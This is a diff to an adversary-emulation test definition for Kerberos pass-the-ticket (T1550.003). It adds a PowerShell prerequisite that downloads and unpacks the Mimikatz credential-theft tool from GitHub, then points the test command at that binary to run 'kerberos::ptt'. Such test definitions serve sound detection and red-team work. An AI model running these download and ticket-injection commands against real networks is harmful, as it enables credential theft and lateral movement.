@@ -16,7 +16,23 @@ atomic_tests:
       description: domain
       type: string
       default: atomic.local
+    mimikatz_exe:
+      description: Path of the Mimikatz binary
+      type: string
+      default: PathToAtomicsFolder\T1550.003\bin\mimikatz.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Mimikatz must exist on disk at specified location (#{mimikatz_exe})
+    prereq_command: |
+      if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+      Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
+      New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
+      Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
   executor:
     command: |
-      mimikatz # kerberos::ptt #{user_name}@#{domain}
+      #{mimikatz_exe} # kerberos::ptt #{user_name}@#{domain}
     name: command_prompt
